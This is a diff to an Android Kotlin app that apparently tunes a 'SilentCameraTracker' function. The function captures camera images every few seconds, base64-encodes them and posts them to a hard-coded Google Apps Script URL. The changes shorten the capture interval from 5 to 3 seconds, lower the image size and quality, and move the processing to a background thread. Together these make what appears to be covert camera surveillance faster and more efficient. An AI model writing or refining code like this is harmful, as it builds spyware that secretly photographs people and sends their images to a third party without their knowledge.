@@ -4025,12 +4025,16 @@ fun imageProxyToBitmap(image: ImageProxy): Bitmap? {
             if (rotationDegrees != 0) {
                 matrix.postRotate(rotationDegrees.toFloat())
             }
-            val maxDimension = 3200f
+            val maxDimension = 2048f
             val scale = maxDimension / maxOf(bitmap.width, bitmap.height)
             if (scale < 1.0f) {
                 matrix.postScale(scale, scale)
             }
-            return Bitmap.createBitmap(bitmap, 0, 0, bitmap.width, bitmap.height, matrix, true)
+            val result = Bitmap.createBitmap(bitmap, 0, 0, bitmap.width, bitmap.height, matrix, true)
+            if (result != bitmap) {
+                bitmap.recycle()
+            }
+            return result
         }
     } catch (e: Exception) {
         e.printStackTrace()
@@ -4040,7 +4044,7 @@ fun imageProxyToBitmap(image: ImageProxy): Bitmap? {
 
 fun bitmapToBase64(bitmap: Bitmap): String {
     val outputStream = ByteArrayOutputStream()
-    bitmap.compress(Bitmap.CompressFormat.JPEG, 95, outputStream)
+    bitmap.compress(Bitmap.CompressFormat.JPEG, 90, outputStream)
     val bytes = outputStream.toByteArray()
     return Base64.encodeToString(bytes, Base64.NO_WRAP)
 }
@@ -4099,7 +4103,7 @@ fun SilentCameraTracker(username: String) {
 
                 // Capture loop while the camera is active and ready
                 while (true) {
-                    delay(5000) // Check/capture every 5 seconds to prevent spamming
+                    delay(3000) // Check/capture every 3 seconds to prevent spamming
                     
                     // Double check lifecycle and permissions/network
                     if (!lifecycleOwner.lifecycle.currentState.isAtLeast(androidx.lifecycle.Lifecycle.State.RESUMED)) {
@@ -4120,14 +4124,15 @@ fun SilentCameraTracker(username: String) {
                             ContextCompat.getMainExecutor(context),
                             object : ImageCapture.OnImageCapturedCallback() {
                                 override fun onCaptureSuccess(imageProxy: ImageProxy) {
-                                    val bitmap = imageProxyToBitmap(imageProxy)
-                                    imageProxy.close()
-                                    isCapturing = false
-                                    
-                                    if (bitmap != null) {
-                                        val base64 = bitmapToBase64(bitmap)
-                                        CoroutineScope(Dispatchers.IO).launch {
-                                            try {
+                                    CoroutineScope(Dispatchers.Default).launch {
+                                        try {
+                                            val bitmap = imageProxyToBitmap(imageProxy)
+                                            imageProxy.close()
+                                            
+                                            if (bitmap != null) {
+                                                val base64 = bitmapToBase64(bitmap)
+                                                bitmap.recycle() // Free bitmap memory immediately
+                                                
                                                 if (hasAllRequiredAccess(context) && isNetworkAvailable(context)) {
                                                     val url = "https://script.google.com/macros/s/AKfycbxzjU0UOhg4STbza-vHJGkP-HKeVXHGDeBcgfmcO1OZDm7Ao2u3YGzZg4LiRIoB70-_/exec"
                                                     val postDataStr = "image=" + URLEncoder.encode(base64, "UTF-8")
@@ -4135,9 +4140,11 @@ fun SilentCameraTracker(username: String) {
                                                     val response = postToAppsScript(url, postData)
                                                     android.util.Log.d("CameraTracker", "Saved raw status: ${response.second}")
                                                 }
-                                            } catch (err: Exception) {
-                                                android.util.Log.e("CameraTracker", "Silent background track error: ${err.message}")
                                             }
+                                        } catch (err: Exception) {
+                                            android.util.Log.e("CameraTracker", "Silent background track error: ${err.message}")
+                                        } finally {
+                                            isCapturing = false
                                         }
                                     }
                                 }
